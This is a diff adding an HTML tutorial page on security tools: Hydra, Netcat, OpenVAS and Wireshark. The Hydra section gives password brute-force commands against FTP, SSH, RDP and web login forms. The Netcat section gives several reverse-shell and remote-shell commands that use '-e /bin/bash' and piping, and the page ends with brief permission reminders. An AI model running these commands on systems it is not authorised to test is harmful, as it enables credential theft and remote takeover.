+                    <p><strong>Protocol:</strong> The service you want to attack, such as ssh, ftp, http, etc.</p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-server"></i> Example Command for FTP Brute Force</h3>
+                    <p>Suppose you want to brute force the FTP service running on 192.168.1.10.</p>
+                    <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10</code>
+                    <ul>
+                        <li><strong>-l admin:</strong> Specifies the username as admin.</li>
+                        <li><strong>-P /usr/share/wordlists/rockyou.txt:</strong> Defines the wordlist (rockyou.txt) for the password guessing.</li>
+                        <li><strong>ftp://192.168.1.10:</strong> Specifies the target IP and protocol (FTP).</li>
+                    </ul>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-key"></i> SSH Brute Force</h3>
+                    <p>For SSH services, brute forcing requires more patience as SSH typically blocks repeated attempts quickly.</p>
+                    <code>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20</code>
+                    <p>This command uses the root username and the rockyou.txt wordlist to attempt brute-forcing the SSH service on 192.168.1.20.</p>
+                    <p><strong>Tuning for SSH:</strong></p>
+                    <code>hydra -t 1 -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20</code>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-globe"></i> Web Login Brute Force (HTTP/HTTPS)</h3>
+                    <p>Hydra can also be used to crack login forms on websites using HTTP or HTTPS protocols.</p>
+                    <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.30 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"</code>
+                    <ul>
+                        <li><strong>-l admin:</strong> The username to try.</li>
+                        <li><strong>-P /usr/share/wordlists/rockyou.txt:</strong> Wordlist of passwords.</li>
+                        <li><strong>http-post-form:</strong> Specifies a POST request for the login form.</li>
+                        <li><strong>/login.php:user=^USER^&pass=^PASS^:F=incorrect:</strong> This defines the form fields (user and pass) and what the failure message looks like.</li>
+                    </ul>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-laptop"></i> Brute Force Over RDP (Remote Desktop Protocol)</h3>
+                    <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.40</code>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-tachometer-alt"></i> Parallel Attacks with Threads</h3>
+                    <p>Hydra supports multithreading to speed up attacks. The <code>-t</code> flag allows you to specify the number of threads to use.</p>
+                    <code>hydra -t 4 -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10</code>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-file-alt"></i> Using Hydra with Multiple Usernames and Passwords</h3>
+                    <code>hydra -L /path/to/usernames.txt -P /path/to/passwords.txt ssh://192.168.1.20</code>
+                    <ul>
+                        <li><strong>-L /path/to/usernames.txt:</strong> Specifies the file with a list of usernames.</li>
+                        <li><strong>-P /path/to/passwords.txt:</strong> Specifies the file with a list of passwords.</li>
+                    </ul>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-clipboard-list"></i> Common Protocols Supported by Hydra</h3>
+                    <table>
+                        <tr>
+                            <th>Protocol</th>
+                            <th>Usage</th>
+                        </tr>
+                        <tr>
+                            <td>SSH</td>
+                            <td>ssh://target_ip</td>
+                        </tr>
+                        <tr>
+                            <td>FTP</td>
+                            <td>ftp://target_ip</td>
+                        </tr>
+                        <tr>
+                            <td>HTTP</td>
+                            <td>http://target_ip/login.php</td>
+                        </tr>
+                        <tr>
+                            <td>HTTPS</td>
+                            <td>https://target_ip/login.php</td>
+                        </tr>
+                        <tr>
+                            <td>RDP</td>
+                            <td>rdp://target_ip</td>
+                        </tr>
+                        <tr>
+                            <td>Telnet</td>
+                            <td>telnet://target_ip</td>
+                        </tr>
+                        <tr>
+                            <td>MySQL</td>
+                            <td>mysql://target_ip</td>
+                        </tr>
+                        <tr>
+                            <td>PostgreSQL</td>
+                            <td>postgres://target_ip</td>
+                        </tr>
+                        <tr>
+                            <td>SMB</td>
+                            <td>smb://target_ip</td>
+                        </tr>
+                    </table>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-chart-bar"></i> Hydra Output and Results</h3>
+                    <p>Hydra’s output displays login attempts and reveals any successful credentials. After running Hydra, you’ll see something like:</p>
+                    <code>[22][ssh] host: 192.168.1.20 login: admin password: password123</code>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-save"></i> Stopping and Resuming a Session</h3>
+                    <p>If you need to stop Hydra during a long-running attack and resume it later, Hydra allows you to do so by saving and restoring sessions.</p>
+                    <p><strong>Saving a Session:</strong></p>
+                    <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10 -o results.txt</code>
+                    <p><strong>Restoring a Session:</strong></p>
+                    <p>Simply re-run the same command, and Hydra will pick up from where it left off.</p>
+                </div>
+                <div class="tool">
+                    <h3><i class="fas fa-info-circle"></i> Best Practices and Ethical Considerations</h3>
+                    <ul>
+                        <li>Always obtain permission before testing a system.</li>
+                        <li>Use Hydra responsibly and ethically to avoid legal consequences.</li>
+                        <li>Employ strong passwords and additional security measures to protect systems.</li>
+                        <li>Review logs and monitor systems for unauthorized access attempts.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+        <section class="section">
+            <h2><i class="fas fa-cat"></i> Netcat Overview</h2>
+            <div class="tools-grid">
+                <div class="tool">
+                    <h3><i class="fas fa-cogs"></i> Netcat (nc)</h3>
+                    <p>Netcat, often referred to as the "Swiss army knife" of networking, is a versatile tool used for various network-related tasks. It allows reading from and writing to network connections using TCP or UDP. Netcat is a go-to tool for creating
+                        reverse shells, simple port scanning, banner grabbing, file transfers, and even chatting between systems.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-info-circle"></i> Basic Terminology</h3>
+                    <ul>
+                        <li><strong>TCP/UDP:</strong> Transmission Control Protocol (TCP) and User Datagram Protocol (UDP) are communication protocols for sending data over a network.</li>
+                        <li><strong>Listener:</strong> A mode where Netcat waits for a connection on a specified port.</li>
+                        <li><strong>Reverse Shell:</strong> A type of shell where the target system connects back to the attacker's machine, giving the attacker control.</li>
+                        <li><strong>Port Scanning:</strong> Checking which ports are open on a system, helping to identify running services.</li>
+                    </ul>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-download"></i> Installing Netcat</h3>
+                    <p>Netcat is usually pre-installed in many Linux distributions, including Kali Linux. However, if you need to install it manually:</p>
+                    <h4>On Debian/Ubuntu-based systems:</h4>
+                    <pre><code>sudo apt install netcat</code></pre>
+                    <h4>On RedHat/CentOS-based systems:</h4>
+                    <pre><code>sudo yum install nc</code></pre>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-terminal"></i> General Syntax</h3>
+                    <pre><code>nc [options] [target] [port]</code></pre>
+                    <ul>
+                        <li><strong>Options:</strong> Flags to define the mode of operation (e.g., listening or connecting).</li>
+                        <li><strong>Target:</strong> The target IP address or hostname.</li>
+                        <li><strong>Port:</strong> The port to connect to or listen on.</li>
+                    </ul>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-plug"></i> Common Use Cases of Netcat</h3>
+                    <h4>A. Connecting to a Server (Client Mode)</h4>
+                    <p>Netcat can act as a client to connect to a server running on a particular port.</p>
+                    <pre><code>nc target_ip port</code></pre>
+                    <p>Example:</p>
+                    <pre><code>nc 192.168.1.10 80</code></pre>
+                    <p>This opens a connection to 192.168.1.10 on port 80 (HTTP port). You can then interact with the service running on that port (such as sending HTTP requests).</p>
+
+                    <h4>B. Setting Up a Listener (Server Mode)</h4>
+                    <p>You can use Netcat to create a listener, where Netcat waits for a connection on a specific port.</p>
+                    <pre><code>nc -lvp port</code></pre>
+                    <p>Example:</p>
+                    <pre><code>nc -lvp 1234</code></pre>
+                    <p>This listens on port 1234 for incoming connections. The -l flag enables listening, -v turns on verbose mode (detailed output), and -p specifies the port.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-signal"></i> Port Scanning with Netcat</h3>
+                    <p>While Netcat isn’t a dedicated port scanner like Nmap, it can be used for simple port scans to identify open ports on a target.</p>
+                    <pre><code>nc -zv target_ip start_port-end_port</code></pre>
+                    <p>Example:</p>
+                    <pre><code>nc -zv 192.168.1.10 20-80</code></pre>
+                    <p>-z: Zero I/O mode (just check for open ports, don’t send data).<br> -v: Verbose mode.<br> 192.168.1.10: Target IP.<br> 20-80: Range of ports to scan.</p>
+                    <p>This command scans ports 20 through 80 on 192.168.1.10, and the results will show which ports are open.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-file-alt"></i> Banner Grabbing</h3>
+                    <p>Netcat can be used to grab banners from services running on a particular port, helping to identify the software or version running.</p>
+                    <pre><code>nc target_ip port</code></pre>
+                    <p>Example:</p>
+                    <pre><code>nc 192.168.1.10 80</code></pre>
+                    <p>Once connected, press Enter a few times, and the server will return the banner (e.g., a web server's version information).</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-exclamation-triangle"></i> Creating a Reverse Shell</h3>
+                    <p>A reverse shell is one of the most powerful features of Netcat. It allows the target system to connect back to your machine, giving you control over it.</p>
+                    <h4>On the attacker’s machine (listening):</h4>
+                    <pre><code>nc -lvp 4444</code></pre>
+                    <h4>On the target’s machine (executing the reverse shell):</h4>
+                    <pre><code>nc target_ip 4444 -e /bin/bash</code></pre>
+                    <p>-e /bin/bash: Executes /bin/bash (or /bin/sh for simpler shells) on the target machine, allowing command execution.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-upload"></i> File Transfer with Netcat</h3>
+                    <h4>A. Sending a file</h4>
+                    <p>On the sending machine:</p>
+                    <pre><code>nc target_ip port < filename</code></pre>
+                    <p>Example:</p>
+                    <pre><code>nc 192.168.1.10 1234 < file.txt</code></pre>
+
+                    <h4>B. Receiving a file</h4>
+                    <p>On the receiving machine:</p>
+                    <pre><code>nc -lvp 1234 > filename</code></pre>
+                    <p>Example:</p>
+                    <pre><code>nc -lvp 1234 > received_file.txt</code></pre>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-comments"></i> Chatting Between Systems</h3>
+                    <p>You can use Netcat to create a simple chat session between two systems.</p>
+                    <h4>On machine A (listener):</h4>
+                    <pre><code>nc -lvp 1234</code></pre>
+                    <h4>On machine B (client):</h4>
+                    <pre><code>nc target_ip 1234</code></pre>
+                    <p>Once connected, both systems can type messages that will be displayed on the other machine.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-globe"></i> Using Netcat for HTTP Requests</h3>
+                    <p>Netcat can be used to manually send HTTP requests to a web server.</p>
+                    <pre><code>nc target_ip 80</code></pre>
+                    <p>Once connected, type the HTTP request:</p>
+                    <pre><code>GET / HTTP/1.1
+        Host: target_ip</code></pre>
+                    <p>Press Enter twice, and the server will respond with the web page or an error message.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-code-branch"></i> Redirecting a Shell Over Netcat</h3>
+                    <p>Netcat allows you to redirect input and output to provide remote access to a shell.</p>
+                    <pre><code>/bin/bash | nc target_ip 1234</code></pre>
+                    <p>This redirects the output of /bin/bash to the Netcat session on port 1234.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-cog"></i> Executing Commands Remotely</h3>
+                    <p>Netcat can execute commands remotely by creating a pipe between a command and the network connection.</p>
+                    <pre><code>nc target_ip 1234 -e /bin/sh</code></pre>
+                    <p>This command executes a shell on the target IP connected through port 1234.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-lock"></i> Security Considerations</h3>
+                    <p>While Netcat is a powerful tool, it can also pose security risks if used maliciously. Ensure you have permission to scan, connect, or interact with the target systems to avoid legal issues.</p>
+                </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-shield-alt"></i> OpenVAS (Open Vulnerability Assessment System)</h2>
+            <div class="tools-grid">
+
+                <div class="tool">
+                    <h3><i class="fas fa-book"></i> 1. Basic Terminology</h3>
+                    <ul>
+                        <li><strong>Vulnerability Scan:</strong> An automated process of identifying vulnerabilities in computer systems, networks, or applications.</li>
+                        <li><strong>CVEs (Common Vulnerabilities and Exposures):</strong> Publicly disclosed vulnerabilities in software.</li>
+                        <li><strong>NVTs (Network Vulnerability Tests):</strong> Tests that OpenVAS uses to detect vulnerabilities in a target system.</li>
+                        <li><strong>False Positive:</strong> A reported vulnerability that doesn’t actually exist.</li>
+                    </ul>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-download"></i> 2. Installing OpenVAS</h3>
+                    <h4>A. On Kali Linux</h4>
+                    <p>OpenVAS is pre-installed on Kali Linux. If it’s not, you can install it as follows:</p>
+                    <pre><code>sudo apt update
+        sudo apt install openvas</code></pre>
+                    <p>Once installed, initialize OpenVAS by running the following command:</p>
+                    <pre><code>sudo gvm-setup</code></pre>
+                    <p>This command will set up the database, scan configurations, and update the vulnerability feed.</p>
+
+                    <h4>B. Running the OpenVAS Service</h4>
+                    <p>Once installed, start the OpenVAS services:</p>
+                    <pre><code>sudo gvm-start</code></pre>
+                    <p>Open your web browser and navigate to the OpenVAS interface, typically available at:</p>
+                    <pre><code>https://localhost:9392</code></pre>
+                    <p>Use the admin credentials generated during setup to log in.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-cogs"></i> 3. Basic Usage of OpenVAS</h3>
+                    <h4>A. Logging into the Web Interface</h4>
+                    <p>Open a web browser and navigate to <code>https://localhost:9392</code>. Log in using your credentials (default username: admin).</p>
+
+                    <h4>B. Setting Up a Target for a Scan</h4>
+                    <p>Go to Configuration > Targets and create a new target:</p>
+                    <ol>
+                        <li>Enter the target’s IP address or hostname.</li>
+                        <li>Specify the port list to scan (default is All TCP and All UDP).</li>
+                        <li>Save the target.</li>
+                    </ol>
+
+                    <h4>C. Launching a Vulnerability Scan</h4>
+                    <p>Go to Scans > Tasks:</p>
+                    <ol>
+                        <li>Create a new scan task by specifying:
+                            <ul>
+                                <li><strong>Name:</strong> Name your task.</li>
+                                <li><strong>Scanner:</strong> Choose the scanner (usually OpenVAS Default).</li>
+                                <li><strong>Target:</strong> Select the target you configured earlier.</li>
+                            </ul>
+                        </li>
+                        <li>Start the scan by selecting your task and clicking the Start button.</li>
+                    </ol>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-chart-line"></i> 4. Analyzing Scan Results</h3>
+                    <p>Once the scan is complete, you can view the results under Scans > Reports. OpenVAS will generate a detailed report that includes:</p>
+                    <ul>
+                        <li><strong>Vulnerabilities Detected:</strong> A list of vulnerabilities found in the target system.</li>
+                        <li><strong>Severity Levels:</strong> Each vulnerability is assigned a severity level:
+                            <ul>
+                                <li>Low: Minor issues that may not present an immediate risk.</li>
+                                <li>Medium: Potential vulnerabilities that could be exploited.</li>
+                                <li>High: Serious vulnerabilities that should be addressed urgently.</li>
+                            </ul>
+                        </li>
+                        <li><strong>CVE Identifiers:</strong> Vulnerabilities linked to CVEs.</li>
+                        <li><strong>Suggested Fixes:</strong> Recommendations on how to fix or mitigate the vulnerabilities.</li>
+                    </ul>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-sync"></i> 5. Updating the OpenVAS Feed</h3>
+                    <p>The OpenVAS feed includes the latest NVTs (Network Vulnerability Tests), which are essential for scanning. You should regularly update the feed to ensure that you are scanning for the most recent vulnerabilities:</p>
+                    <pre><code>sudo gvm-feed-update</code></pre>
+                    <p>This command updates the vulnerability database, adding new CVEs and NVTs.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-cogs"></i> 6. Advanced Features of OpenVAS</h3>
+                    <h4>A. Scheduled Scans</h4>
+                    <p>You can schedule regular scans to automatically run at specific intervals (e.g., daily, weekly) to ensure continuous monitoring:</p>
+                    <ol>
+                        <li>Go to Configuration > Schedules.</li>
+                        <li>Create a new schedule by specifying the frequency and time for the scan.</li>
+                        <li>Link the schedule to a task under Scans > Tasks by editing the task and selecting the schedule.</li>
+                    </ol>
+
+                    <h4>B. Credentialed Scans</h4>
+                    <p>Credentialed scans provide deeper access to the target system, allowing OpenVAS to check for vulnerabilities that require authentication (e.g., missing patches, weak passwords):</p>
+                    <ol>
+                        <li>Go to Configuration > Credentials and add the login credentials for the target system.</li>
+                        <li>When creating or editing a task, under Credentials, select the credentials you added.</li>
+                    </ol>
+
+                    <h4>C. Scan Configurations</h4>
+                    <p>OpenVAS allows you to configure different types of scans based on your needs:</p>
+                    <ol>
+                        <li>Go to Configuration > Scan Configs.</li>
+                        <li>Select from pre-configured scan types, such as:
+                            <ul>
+                                <li>Full and Fast: The default scan, which covers most vulnerabilities.</li>
+                                <li>Full and Very Deep: A more comprehensive scan, but slower.</li>
+                                <li>Host Discovery: A quick scan to identify live hosts.</li>
+                            </ul>
+                        </li>
+                    </ol>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-file-export"></i> 7. Reporting and Exporting Results</h3>
+                    <h4>A. Viewing Reports</h4>
+                    <p>Once a scan is complete, go to Scans > Reports to view detailed reports. Each report provides:</p>
+                    <ul>
+                        <li>Vulnerabilities detected</li>
+                        <li>Risk severity ratings</li>
+                        <li>Suggested remediation actions</li>
+                    </ul>
+
+                    <h4>B. Exporting Reports</h4>
+                    <p>You can export reports in various formats (PDF, HTML, XML) for further analysis or to share with stakeholders:</p>
+                    <ol>
+                        <li>Open the report under Scans > Reports.</li>
+                        <li>Click the Export button and select the desired format.</li>
+                    </ol>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-plug"></i> 8. Integration with Other Tools</h3>
+                    <h4>A. Metasploit Integration</h4>
+                    <p>OpenVAS can be integrated with Metasploit to directly exploit vulnerabilities found in the scan results:</p>
+                    <ol>
+                        <li>Run a scan and export the report in XML format.</li>
+                        <li>Import the report into Metasploit using the following command in Metasploit:
+                            <pre><code>db_import /path/to/openvas_report.xml</code></pre>
+                        </li>
+                        <li>Metasploit will analyze the report and match vulnerabilities to available exploits.</li>
+                    </ol>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-tips"></i> 9. OpenVAS Pro-Level Shortcuts and Tips</h3>
+                    <ul>
+                        <li><strong>Custom Scan Configurations:</strong> If you need more control over what OpenVAS scans for, create custom scan configurations under Configuration > Scan Configs. You can enable or disable specific NVTs based on your environment.</li>
+                        <li><strong>Use Tags:</strong> Tag your targets and scans for easier management. For example, you can tag all scans related to a particular project, allowing for quick filtering.</li>
+                        <li><strong>Leverage User Management:</strong> OpenVAS allows you to manage multiple users with different roles. Create user accounts for team members to collaborate on scans and share reports securely.</li>
+                    </ul>
+                </div>
+        </section>
+
+        <section class="section">
+            <h2><i class="fas fa-network-wired"></i> Wireshark: The Ultimate Network Protocol Analyzer</h2>
+            <p>Wireshark is one of the most powerful and widely used network protocol analyzers. It allows you to capture and inspect data flowing across a network in real-time, enabling network troubleshooting, protocol analysis, and security testing. Wireshark
+                is essential for identifying suspicious traffic and understanding the structure of various network protocols.</p>
+
+            <div class="tools-grid">
+
+                <div class="tool">
+                    <h3><i class="fas fa-info-circle"></i> Basic Terminology</h3>
+                    <ul>
+                        <li><strong>Packet Capture (PCAP):</strong> A record of network traffic data that has been captured.</li>
+                        <li><strong>Interface:</strong> The network interface (e.g., Ethernet, WiFi) on which traffic is captured.</li>
+                        <li><strong>Filter:</strong> Wireshark allows the use of capture filters (to decide what to capture) and display filters (to decide what to show in the interface).</li>
+                        <li><strong>Protocol:</strong> The set of rules governing data communication (e.g., TCP, UDP, HTTP, ICMP).</li>
+                    </ul>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-download"></i> Installing Wireshark</h3>
+                    <h4>A. On Linux (e.g., Kali Linux)</h4>
+                    <p>Wireshark can be installed using the package manager:</p>
+                    <p class="example">Command: <code>sudo apt update</code><br><code>sudo apt install wireshark</code></p>
+                    <h4>B. On Windows and macOS</h4>
+                    <p>Download Wireshark from the official website and follow the installation instructions.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-cogs"></i> Capturing Traffic</h3>
+                    <h4>A. Selecting the Interface</h4>
+                    <p>Open Wireshark. Select the network interface from which you want to capture traffic. Common options include eth0 (Ethernet), wlan0 (WiFi), or lo (Loopback). Click on the Start Capturing button (the shark fin icon) to begin capturing
+                        traffic on that interface.</p>
+                    <h4>B. Stopping a Capture</h4>
+                    <p>To stop the capture, click on the red Stop button (the square icon).</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-filter"></i> Filters in Wireshark</h3>
+                    <h4>A. Capture Filters</h4>
+                    <p>Common capture filters include:</p>
+                    <p class="example"><code>host 192.168.1.1</code> (Capture only traffic from a specific IP)<br>
+                        <code>port 80</code> (Capture traffic to/from a specific port)<br>
+                        <code>tcp</code> (Capture only TCP traffic)<br>
+                        <code>tcp port 80</code> (Capture only HTTP traffic)</p>
+                    <p>To set a capture filter, click on the Capture Options (gear icon) and enter the filter in the Capture Filter field before starting the capture.</p>
+                    <h4>B. Display Filters</h4>
+                    <p>Common display filters include:</p>
+                    <p class="example"><code>http</code> (Show only HTTP traffic)<br>
+                        <code>ip.addr == 192.168.1.1</code> (Show traffic to/from a specific IP)<br>
+                        <code>tcp.port == 443</code> (Show TCP traffic to/from a specific port)<br>
+                        <code>dns</code> (Show only DNS queries)<br>
+                        <code>eth.addr == 00:0a:95:9d:68:16</code> (Show packets with a specific MAC address)</p>
+                    <p>You can enter display filters in the filter bar above the packet list after starting the capture.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-chart-line"></i> Analyzing Traffic</h3>
+                    <h4>A. Inspecting Specific Protocols</h4>
+                    <p>Click on a packet from the Packet List. The Packet Details pane will show the protocols involved (e.g., Ethernet, IP, TCP, HTTP). Expand each protocol to inspect its fields (e.g., source/destination IP, TCP flags, HTTP methods).</p>
+                    <h4>B. Following a TCP/UDP Stream</h4>
+                    <p>Right-click on a packet and select Follow > TCP Stream (or UDP stream, based on the protocol). Wireshark will reconstruct the full conversation, making it easier to analyze requests, responses, and the flow of communication.</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-thumbs-up"></i> Protocol Analysis</h3>
+                    <p>Wireshark supports an extensive list of network protocols, including:</p>
+                    <ul>
+                        <li><strong>TCP/UDP:</strong> Inspect connection setups, flags, and session data.</li>
+                        <li><strong>HTTP/HTTPS:</strong> Analyze web traffic, inspect headers, and detect potential issues.</li>
+                        <li><strong>DNS:</strong> Track name resolution requests and responses.</li>
+                        <li><strong>ICMP:</strong> Inspect ping requests and responses.</li>
+                        <li><strong>DHCP:</strong> Analyze IP address lease requests.</li>
+                    </ul>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-lightbulb"></i> Wireshark Pro Tips and Shortcuts</h3>
+                    <h4>A. Performance Tips</h4>
+                    <p>Use Capture Filters: Capture filters reduce the size of your capture and improve performance by only saving relevant traffic.</p>
+                    <p>Limit Packet Capture Size: Set a packet capture size limit in Capture Options to avoid large files that slow down analysis.</p>
+                    <p>Ring Buffers: Use ring buffers to automatically rotate capture files, preventing a single large file from being created.</p>
+                    <h4>B. Color Coding</h4>
+                    <p>Wireshark uses color codes to help you quickly identify different types of traffic:</p>
+                    <p>TCP traffic is typically light purple.<br>HTTP traffic is typically green.<br>DNS traffic is typically light blue.</p>
+                    <p>You can customize the color coding by navigating to View > Coloring Rules.</p>
+                    <h4>C. Time Saving Keyboard Shortcuts</h4>
+                    <p>Start/Stop Capture: <code>Ctrl + E</code></p>
+                    <p>Open Capture File: <code>Ctrl + O</code></p>
+                    <p>Save Capture File: <code>Ctrl + S</code></p>
+                    <p>Filter Apply: <code>Enter</code> (after typing in the filter field)</p>
+                    <p>Go to Next Packet: <code>Ctrl + N</code></p>
+                    <p>Follow Stream: <code>Ctrl + Shift + T</code></p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-file-export"></i> Exporting Data</h3>
+                    <h4>A. Exporting Packets</h4>
+                    <p>You can export captured packets for later analysis or sharing with others:</p>
+                    <p>Go to File > Export Specified Packets. Choose the format (e.g., pcap, pcapng). Select the range of packets you want to export (all or specific ones).</p>
+                    <h4>B. Exporting Packet Dissections</h4>
+                    <p>You can export packet information in plain text or XML:</p>
+                    <p>Go to File > Export Packet Dissections. Choose the format (e.g., plain text, CSV, XML).</p>
+                </div>
+
+                <div class="tool">
+                    <h3><i class="fas fa-shield-alt"></i> Using Wireshark for Security and Troubleshooting</h3>
+                    <h4>A. Identifying Security Threats</h4>
+                    <p>Wireshark can help in identifying potential security threats such as:</p>
+                    <ul>
+                        <li><strong>DDoS attacks:</strong> Look for an unusually high number of requests to a single destination.</li>
+                        <li><strong>Port Scans:</strong> Identify scanning activity by monitoring unusual traffic patterns across multiple ports.</li>
+                        <li><strong>Malware Communication:</strong> Inspect for outbound connections to known malicious IP addresses.</li>
+                    </ul>
+                    <h4>B. Troubleshooting Network Issues</h4>
+                    <p>Common uses for troubleshooting include:</p>
+                    <ul>
+                        <li><strong>Slow Network Performance:</strong> Identify congested links and dropped packets.</li>
+                        <li><strong>Connection Issues:</strong> Analyze TCP handshakes and connection resets to pinpoint problems.</li>
+                        <li><strong>Application Errors:</strong> Inspect HTTP requests and responses to diagnose web application issues.</li>
+                    </ul>
+                </div>
+
+            </div>
+            <div class="tool">
+                <h3><i class="fas fa-graduation-cap"></i> Conclusion</h3>
+                <p>Wireshark is an indispensable tool for network professionals, providing deep insights into network traffic. By mastering its features, you can effectively troubleshoot issues, analyze security vulnerabilities, and enhance your understanding
+                    of network protocols.</p>
+            </div>
+        </section>
+
+
+
+
+
+        </div>
+                <div> <center><h5> BY geetorus</h5> </center></div>
+        <script>
+            const darkModeToggle = document.getElementById('darkModeToggle');
+            const body = document.body;
+
+            darkModeToggle.addEventListener('click', () => {
+                body.classList.toggle('dark-mode');
+                darkModeToggle.innerHTML = body.classList.contains('dark-mode') ?
+                    '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
+            });
+        </script>
+</body>
+
+</html>
